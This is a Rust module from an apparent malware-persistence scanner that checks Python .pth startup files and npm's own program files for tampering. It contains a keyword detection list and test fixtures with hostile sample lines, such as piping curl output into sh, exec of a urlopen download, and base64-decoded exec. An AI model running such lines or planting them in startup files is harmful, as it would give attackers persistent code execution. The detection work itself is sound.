//! Persistence inside the language runtimes: Python's `.pth` startup files
//! and npm's own program files.
//!
//! Neither is a login item, and neither shows up in a process list until it
//! runs. A `.pth` file in a `site-packages` directory has every line that
//! begins with `import` executed each time Python starts, which is how the
//! `pybitjs` package re-runs itself (the 2026-10-05 indicator review). npm's
//! `lib/cli.js`, a few hundred bytes as npm ships it, was found replaced with a
//! one-megabyte copy carrying the payload, so that every `npm` and `npx`
//! command starts it again (the 2026-09-14 review). Cleaning every repository
//! and rotating every credential does not touch either. See ADR-0042.
//!
//! Places on the machine are read under the home directory given and, for
//! what is installed for every user, under the host's system root, so the
//! corpus can supply both as files (ADR-0029). Nothing here runs Python or
//! npm: asking a tool suspected of carrying the payload a question its files
//! answer is not a trade worth making.

use crate::checks::Sink;
use crate::host::{system_path, Host, Platform, Probe};
use crate::indicators::Indicators;
use crate::strip::MIN_PADDING;
use crate::verdict::{Finding, Kind, Verdict};
use crate::walk::Walk;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

/// Paths under `base` matching `pattern`, a `/`-separated path in which a
/// component may hold one `*`. Sorted, and nothing that is not there.
fn expand(base: &Path, pattern: &str) -> Vec<PathBuf> {
    let mut current = vec![base.to_path_buf()];
    for part in pattern.split('/').filter(|p| !p.is_empty()) {
        let mut next = Vec::new();
        for dir in &current {
            match part.split_once('*') {
                Some((head, tail)) => {
                    let Ok(entries) = fs::read_dir(dir) else {
                        continue;
                    };
                    for entry in entries.flatten() {
                        let name = entry.file_name();
                        let Some(name) = name.to_str() else { continue };
                        if name.len() >= head.len() + tail.len()
                            && name.starts_with(head)
                            && name.ends_with(tail)
                        {
                            next.push(dir.join(name));
                        }
                    }
                }
                None => {
                    let path = dir.join(part);
                    if fs::symlink_metadata(&path).is_ok() {
                        next.push(path);
                    }
                }
            }
        }
        next.sort();
        current = next;
    }
    current
}

/// Add `path` unless the same file is already listed, under any name: a
/// `lib64` that links to `lib`, or a home folder that is also a scanned root.
fn push_unique(list: &mut Vec<(PathBuf, PathBuf)>, path: PathBuf) {
    let real = fs::canonicalize(&path).unwrap_or_else(|_| path.clone());
    if !list.iter().any(|(_, r)| *r == real) {
        list.push((path, real));
    }
}

// ---------------------------------------------------------------------------
// Python
// ---------------------------------------------------------------------------

/// Where Python keeps the packages of one user, under the home directory.
const PYTHON_USER: &[&str] = &[
    ".local/lib/python*/site-packages",
    "Library/Python/*/lib/python/site-packages",
    ".pyenv/versions/*/lib/python*/site-packages",
    ".local/share/uv/python/*/lib/python*/site-packages",
    ".local/share/pipx/venvs/*/lib/python*/site-packages",
    ".local/share/mise/installs/python/*/lib/python*/site-packages",
    ".asdf/installs/python/*/lib/python*/site-packages",
    ".virtualenvs/*/lib/python*/site-packages",
    "miniconda3/lib/python*/site-packages",
    "miniconda3/envs/*/lib/python*/site-packages",
    "anaconda3/lib/python*/site-packages",
    "anaconda3/envs/*/lib/python*/site-packages",
    "miniforge3/lib/python*/site-packages",
    "miniforge3/envs/*/lib/python*/site-packages",
    "AppData/Roaming/Python/Python*/site-packages",
    "AppData/Local/Programs/Python/Python*/Lib/site-packages",
];

/// Where Python keeps the packages installed for every user.
fn python_system(platform: Platform) -> &'static [&'static str] {
    match platform {
        Platform::Linux => &[
            "usr/lib/python*/site-packages",
            "usr/lib/python*/dist-packages",
            "usr/lib64/python*/site-packages",
            "usr/local/lib/python*/site-packages",
            "usr/local/lib/python*/dist-packages",
        ],
        Platform::MacOs => &[
            "Library/Frameworks/Python.framework/Versions/*/lib/python*/site-packages",
            "Library/Python/*/site-packages",
            "Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/*/lib/python*/site-packages",
            "opt/homebrew/lib/python*/site-packages",
            "usr/local/lib/python*/site-packages",
        ],
        Platform::Windows => &[
            "Program Files/Python*/Lib/site-packages",
            "Program Files (x86)/Python*/Lib/site-packages",
            "Python*/Lib/site-packages",
        ],
    }
}

/// Inside a virtual environment.
const PYTHON_ENV: &[&str] = &[
    "lib/python*/site-packages",
    "lib64/python*/site-packages",
    "Lib/site-packages",
];

fn is_site_dir(dir: &Path) -> bool {
    matches!(
        dir.file_name().and_then(|n| n.to_str()),
        Some("site-packages" | "dist-packages")
    )
}

fn pth_files_in(dir: &Path, out: &mut Vec<(PathBuf, PathBuf)>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    let mut found: Vec<PathBuf> = entries
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().and_then(|x| x.to_str()) == Some("pth") && p.is_file())
        .collect();
    found.sort();
    for path in found {
        push_unique(out, path);
    }
}

/// What a startup file says.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Pth {
    /// It carries a confirmed indicator.
    Indicator,
    /// A line Python executes does something packages do not do there.
    RunsCode,
    /// Path entries, and imports of the kind packaging tools write.
    Quiet,
}

/// What a line Python executes would have to contain to be worth a human's
/// time. Packaging tools write imports, `sys.path` arithmetic and namespace
/// set-up; none of them decodes, downloads or starts a process.
const PTH_TELLS: &[&str] = &[
    "exec(",
    "eval(",
    "compile(",
    "base64",
    "b64decode",
    "fromhex",
    "marshal",
    "zlib",
    "codecs.decode",
    "subprocess",
    "os.system",
    "os.popen",
    "os.spawn",
    "os.exec",
    "os.startfile",
    "pty.spawn",
    "socket",
    "urllib",
    "urlopen",
    "http.client",
    "requests.get",
    "requests.post",
    "ctypes",
];

/// A longer line than any packaging tool writes. Namespace package lines,
/// the longest legitimate ones, run to a few hundred characters.
const PTH_LONG_LINE: usize = 2000;

/// Lines that use one of the tells for a reason that is public and common,
/// each recognised by what only it says. pytest-cov runs coverage in
/// subprocesses through an `exec` and mentions the word "subprocess" in its
/// error message; python-hunter traces through an `exec` gated on its own
/// variable. A known line still counts if it uses a tell it does not need.
const PTH_KNOWN: &[(&[&str], &[&str])] = &[
    (
        &["COV_CORE_SOURCE", "pytest_cov.embed"],
        &["exec(", "subprocess"],
    ),
    (&["PYTHONHUNTER"], &["exec("]),
];

/// Would Python execute this line, and does it do more than packages do?
fn runs_code(line: &str) -> bool {
    if line.len() > PTH_LONG_LINE {
        return true;
    }
    let tells: Vec<&str> = PTH_TELLS
        .iter()
        .copied()
        .filter(|t| line.contains(t))
        .collect();
    if tells.is_empty() {
        return false;
    }
    !PTH_KNOWN.iter().any(|(marks, allowed)| {
        marks.iter().all(|m| line.contains(m)) && tells.iter().all(|t| allowed.contains(t))
    })
}

fn read_pth(text: &str, ind: &Indicators) -> Pth {
    if ind.has_strong(text) {
        return Pth::Indicator;
    }
    // site.py executes a line that starts with "import" and a space or a
    // tab, exactly. Everything else is a path, or a comment.
    let executes = |line: &&str| line.starts_with("import ") || line.starts_with("import\t");
    if text.lines().filter(executes).any(runs_code) {
        Pth::RunsCode
    } else {
        Pth::Quiet
    }
}

/// Python startup files: every `.pth` in a `site-packages` directory under
/// the scanned paths and in the virtual environments there, then those of
/// this user's Python under `home`, then, with a host to read, those
/// installed for every user.
pub fn python_startup(
    walk: &Walk,
    home: Option<&Path>,
    host: Option<&dyn Host>,
    ind: &Indicators,
    v: &mut Verdict,
    sink: &mut Sink,
) {
    v.section("Python startup files (.pth)");
    let mut files: Vec<(PathBuf, PathBuf)> = Vec::new();

    for path in walk.by_name(|n| n.ends_with(".pth")) {
        // A .pth anywhere else is not run by anything, and PyTorch saves its
        // models with the same extension.
        if path.parent().is_some_and(is_site_dir) {
            push_unique(&mut files, path.clone());
        }
    }
    for env in &walk.python_envs {
        for pattern in PYTHON_ENV {
            for dir in expand(env, pattern) {
                pth_files_in(&dir, &mut files);
            }
        }
    }
    if let Some(home) = home {
        for pattern in PYTHON_USER {
            for dir in expand(home, pattern) {
                pth_files_in(&dir, &mut files);
            }
        }
    }
    if let Some(host) = host {
        match host.system_root() {
            Probe::Read(root) => {
                for pattern in python_system(host.platform()) {
                    for dir in expand(&root, pattern) {
                        pth_files_in(&dir, &mut files);
                    }
                }
            }
            Probe::NoTool(why) | Probe::Failed(why) => v.push(Finding::review(format!(
                "system directories could not be read, so Python installed for every user was not checked: {why}"
            ))),
        }
    }

    let mut flagged = 0usize;
    for (path, _) in &files {
        let text = match fs::read(path) {
            Ok(bytes) => String::from_utf8_lossy(&bytes).into_owned(),
            Err(e) => {
                flagged += 1;
                v.push(Finding::review(format!(
                    "could not read, so it was not checked: {} ({e})",
                    path.display()
                )));
                continue;
            }
        };
        match read_pth(&text, ind) {
            Pth::Indicator => {
                flagged += 1;
                let line = sink.take(path, "python-startup-file");
                v.push(
                    Finding::hit(
                        Kind::PthFile,
                        format!("Python startup file contains an indicator: {}", path.display()),
                    )
                    .at(path)
                    .with_remedy(
                        "Python runs this file every time it starts. After quarantine, uninstall the package that put it there, or delete and recreate that environment.",
                    )
                    .with_remedy(line),
                );
            }
            Pth::RunsCode => {
                flagged += 1;
                v.push(
                    Finding::review(format!(
                        "Python startup file runs code that packages do not usually put there, verify it by hand: {}",
                        path.display()
                    ))
                    .at(path),
                );
            }
            Pth::Quiet => {}
        }
    }

    if flagged == 0 {
        let scope = match (home, host) {
            (None, _) => " under the scanned paths",
            (Some(_), None) => " (--fs-only: Python installed for every user was not read)",
            (Some(_), Some(_)) => "",
        };
        v.push(Finding::ok(if files.is_empty() {
            format!("no Python startup files (.pth){scope}")
        } else {
            format!(
                "{} Python startup file{} (.pth) checked, none runs anything unusual{scope}",
                files.len(),
                if files.len() == 1 { "" } else { "s" }
            )
        }));
    }
}

// ---------------------------------------------------------------------------
// npm
// ---------------------------------------------------------------------------

/// Where npm is installed for one user, under the home directory: global
/// prefixes and the version managers people use.
fn npm_user(platform: Platform) -> &'static [&'static str] {
    match platform {
        Platform::Windows => &[
            "AppData/Roaming/npm/node_modules/npm",
            "AppData/Roaming/nvm/*/node_modules/npm",
            "AppData/Local/Volta/tools/image/node/*/node_modules/npm",
            "AppData/Roaming/fnm/node-versions/*/installation/node_modules/npm",
        ],
        Platform::Linux | Platform::MacOs => &[
            ".npm-global/lib/node_modules/npm",
            ".npm-packages/lib/node_modules/npm",
            ".local/lib/node_modules/npm",
            ".nvm/versions/node/*/lib/node_modules/npm",
            ".volta/tools/image/node/*/lib/node_modules/npm",
            ".volta/tools/image/npm/*",
            ".fnm/node-versions/*/installation/lib/node_modules/npm",
            ".local/share/fnm/node-versions/*/installation/lib/node_modules/npm",
            "Library/Application Support/fnm/node-versions/*/installation/lib/node_modules/npm",
            ".asdf/installs/nodejs/*/lib/node_modules/npm",
            ".local/share/mise/installs/node/*/lib/node_modules/npm",
            "n/lib/node_modules/npm",
        ],
    }
}

/// Where npm is installed for every user.
fn npm_system(platform: Platform) -> &'static [&'static str] {
    match platform {
        Platform::Windows => &[
            "Program Files/nodejs/node_modules/npm",
            "Program Files (x86)/nodejs/node_modules/npm",
        ],
        Platform::Linux | Platform::MacOs => &[
            "usr/lib/node_modules/npm",
            "usr/local/lib/node_modules/npm",
            "usr/share/nodejs/npm",
            "opt/homebrew/lib/node_modules/npm",
            "opt/local/lib/node_modules/npm",
            "usr/local/n/versions/node/*/lib/node_modules/npm",
        ],
    }
}

/// The files every `npm` and `npx` command runs first. Each is a few
/// kilobytes at most as npm ships it: `lib/cli.js` is four lines in npm 10.
const NPM_ENTRY_FILES: &[&str] = &[
    "lib/cli.js",
    "lib/cli/entry.js",
    "bin/npm-cli.js",
    "bin/npx-cli.js",
];

/// Larger than any release of npm has shipped one of those files. The
/// replacement the review describes is about a megabyte.
const NPM_ENTRY_MAX: u64 = 64 * 1024;

/// Why an entry file does not look the way npm ships it, if it does not.
fn npm_altered(bytes: &[u8]) -> Option<String> {
    let size = bytes.len() as u64;
    if size > NPM_ENTRY_MAX {
        return Some(format!("{} KB, where npm ships a few", size / 1024));
    }
    let text = String::from_utf8_lossy(bytes);
    if text.lines().any(|l| l.len() > 4000) {
        return Some("a line longer than 4000 characters".into());
    }
    // The payload goes after a long run of blank space, on a line that
    // otherwise looks ordinary.
    let padded = text.lines().any(|line| {
        let mut run = 0usize;
        let mut after_run = false;
        for c in line.chars() {
            if c == ' ' || c == '\t' {
                run += 1;
            } else {
                if run >= MIN_PADDING {
                    after_run = true;
                }
                run = 0;
            }
        }
        after_run
    });
    padded.then(|| "code after a long run of blank space".into())
}

/// `prefix=` in `~/.npmrc` moves where `npm install -g` puts npm itself.
fn npmrc_prefixes(home: &Path, root: Option<&Path>, platform: Platform) -> Vec<PathBuf> {
    let Ok(bytes) = fs::read(home.join(".npmrc")) else {
        return Vec::new();
    };
    let text = String::from_utf8_lossy(&bytes);
    let mut out = Vec::new();
    for value in text
        .lines()
        .filter_map(|l| l.split_once('='))
        .filter(|(key, _)| key.trim() == "prefix")
        .map(|(_, value)| value.trim().trim_matches('"'))
    {
        let base = if let Some(rest) = value.strip_prefix("~/") {
            home.join(rest)
        } else if let Some(root) = root {
            system_path(root, value)
        } else {
            continue;
        };
        out.push(if platform == Platform::Windows {
            base.join("node_modules").join("npm")
        } else {
            base.join("lib").join("node_modules").join("npm")
        });
    }
    out
}

/// npm's own program files, in every installation of npm this machine has in
/// the usual places.
pub fn npm_program(
    home: &Path,
    host: &dyn Host,
    ind: &Indicators,
    v: &mut Verdict,
    sink: &mut Sink,
) {
    v.section("npm's own program files");
    let platform = host.platform();
    let mut installs: Vec<(PathBuf, PathBuf)> = Vec::new();
    for pattern in npm_user(platform) {
        for dir in expand(home, pattern) {
            push_unique(&mut installs, dir);
        }
    }
    let root = match host.system_root() {
        Probe::Read(root) => Some(root),
        Probe::NoTool(why) | Probe::Failed(why) => {
            v.push(Finding::review(format!(
                "system directories could not be read, so npm installed for every user was not checked: {why}"
            )));
            None
        }
    };
    if let Some(root) = &root {
        for pattern in npm_system(platform) {
            for dir in expand(root, pattern) {
                push_unique(&mut installs, dir);
            }
        }
    }
    for dir in npmrc_prefixes(home, root.as_deref(), platform) {
        if dir.is_dir() {
            push_unique(&mut installs, dir);
        }
    }
    installs.retain(|(dir, _)| dir.is_dir());

    let mut flagged = 0usize;
    for (dir, _) in &installs {
        for name in NPM_ENTRY_FILES {
            let path = name.split('/').fold(dir.clone(), |p, part| p.join(part));
            // Read through a link, as npm would run it.
            let bytes = match fs::read(&path) {
                Ok(bytes) => bytes,
                Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
                Err(e) => {
                    flagged += 1;
                    v.push(Finding::review(format!(
                        "could not read, so it was not checked: {} ({e})",
                        path.display()
                    )));
                    continue;
                }
            };
            if ind.bytes_have_strong(&bytes) {
                flagged += 1;
                let line = sink.take(&path, "npm-program-file");
                v.push(
                    Finding::hit(
                        Kind::NpmProgram,
                        format!("npm's own program file contains an indicator: {}", path.display()),
                    )
                    .at(&path)
                    .with_remedy(
                        "every npm and npx command starts the payload again. Reinstall Node.js, or this version of it in your version manager, before running npm.",
                    )
                    .with_remedy(line),
                );
            } else if let Some(why) = npm_altered(&bytes) {
                flagged += 1;
                v.push(
                    Finding::review(format!(
                        "npm's own program file looks altered ({why}), verify it by hand: {}",
                        path.display()
                    ))
                    .at(&path),
                );
            }
        }
    }

    if flagged == 0 {
        v.push(Finding::ok(match installs.len() {
            0 => "no npm installation found in the usual places".to_string(),
            1 => "1 npm installation checked, its program files are as npm ships them".to_string(),
            n => {
                format!("{n} npm installations checked, their program files are as npm ships them")
            }
        }));
    }
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used, clippy::indexing_slicing)]
mod tests {
    use super::*;

    /// Startup files Python packages ship today, each as it reads. None of
    /// them may be a finding.
    const ORDINARY_PTH: &[&str] = &[
        // virtualenv and uv
        "import _virtualenv",
        // setuptools
        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); ",
        // a setuptools editable install
        "import __editable___mypkg_1_0_finder; __editable___mypkg_1_0_finder.install()",
        // a namespace package, the longest ordinary line
        "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])));m = m or sys.modules.setdefault('google', types.ModuleType('google'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)",
        // easy-install
        "import sys; sys.__plen = len(sys.path)\n./mypkg-1.0-py3.9.egg\nimport sys; new = sys.path[sys.__plen:]; del sys.path[sys.__plen:]; p = getattr(sys, '__egginsert', 0); sys.path[p:p] = new; sys.__egginsert = p + len(new)",
        // pywin32
        "# .pth file for the PyWin32 extensions\nwin32\nwin32\\lib\nPythonwin\n# And some hackery to deal with environments where the post_install script\n# isn't run.\nimport pywin32_bootstrap",
        // pytest-cov
        "import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n  try:\\n    from pytest_cov.embed import init\\n    init()\\n  except Exception as exc:\\n    sys.stderr.write(\\n      \"pytest-cov: Failed to setup subprocess coverage. \"\\n      \"Environ: {0!r} \"\\n      \"Exception: {1!r}\\\\n\".format(\\n        dict((k, v) for k, v in os.environ.items() if k.startswith(\\'COV_CORE\\')),\\n        exc\\n      )\\n    )\\n')",
        // coverage
        "import coverage; coverage.process_startup()",
        // pip-system-certs
        "import pip_system_certs.wrapt_requests; pip_system_certs.wrapt_requests.inject_truststore()",
        // a plain path list, and Homebrew
        "/home/u/src/project\n../shared",
        "import site; site.addsitedir('/opt/homebrew/lib/python3.12/site-packages')",
    ];

    fn ind() -> Indicators {
        Indicators {
            strong: vec!["MARKER-ALPHA".into()],
            bad_packages: vec!["evilpypkg".into()],
            ..Indicators::default()
        }
    }

    #[test]
    fn what_packaging_tools_write_is_quiet() {
        for text in ORDINARY_PTH {
            assert_eq!(read_pth(text, &ind()), Pth::Quiet, "{text}");
        }
    }

    #[test]
    fn a_startup_file_that_decodes_downloads_or_runs_is_review() {
        for text in [
            "import base64;exec(base64.b64decode('aW1wb3J0IG9z'))",
            "import os;os.system('curl -s http://x | sh')",
            "import subprocess;subprocess.Popen(['python','-c','x'])",
            "import urllib.request as u;exec(u.urlopen('http://x').read())",
            // A known line with a tell it has no use for.
            "import os;exec('COV_CORE_SOURCE pytest_cov.embed');os.system('x')",
            &format!("import x;y='{}'", "A".repeat(PTH_LONG_LINE)),
        ] {
            assert_eq!(read_pth(text, &ind()), Pth::RunsCode, "{text}");
        }
        // Not executed: a path line that merely holds the word.
        assert_eq!(read_pth("/srv/exec(/lib", &ind()), Pth::Quiet);
        assert_eq!(read_pth(" import os;os.system('x')", &ind()), Pth::Quiet);
    }

    #[test]
    fn an_indicator_or_a_campaign_package_is_confirmed() {
        assert_eq!(read_pth("import x # MARKER-ALPHA", &ind()), Pth::Indicator);
        assert_eq!(read_pth("import evilpypkg", &ind()), Pth::Indicator);
        assert_eq!(read_pth("import evilpypkg_helpers", &ind()), Pth::Quiet);
    }

    #[test]
    fn npm_entry_files_as_shipped_are_not_altered() {
        let npm10 = b"const validateEngines = require('./cli/validate-engines.js')\nconst cliEntry = require('node:path').resolve(__dirname, 'cli/entry.js')\n\nmodule.exports = (process) =>\n  validateEngines(process, () => require(cliEntry))\n";
        assert_eq!(npm_altered(npm10), None);
        let shim = b"#!/usr/bin/env node\nrequire('../lib/cli.js')(process)\n";
        assert_eq!(npm_altered(shim), None);
        let mut big = npm10.to_vec();
        big.extend(std::iter::repeat_n(b'x', 70 * 1024));
        assert!(npm_altered(&big).is_some_and(|w| w.ends_with("KB, where npm ships a few")));
        let padded = format!(
            "module.exports = (process) => {{}}{}require('child_process')\n",
            " ".repeat(300)
        );
        assert_eq!(
            npm_altered(padded.as_bytes()).as_deref(),
            Some("code after a long run of blank space")
        );
        // Trailing blanks alone are not a payload.
        let trailing = format!("module.exports = 1{}\n", " ".repeat(300));
        assert_eq!(npm_altered(trailing.as_bytes()), None);
    }

    #[test]
    fn a_pattern_with_a_star_lists_what_is_there() {
        let dir = std::env::temp_dir().join(format!("prc-runtimes-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        for p in [
            "lib/python3.11/site-packages",
            "lib/python3.12/site-packages",
            "lib/pythonista/other",
        ] {
            fs::create_dir_all(dir.join(p)).expect("mkdir");
        }
        let found = expand(&dir, "lib/python*/site-packages");
        assert_eq!(found.len(), 2, "{found:?}");
        assert!(expand(&dir, "lib/ruby*/gems").is_empty());
        let _ = fs::remove_dir_all(&dir);
    }
}
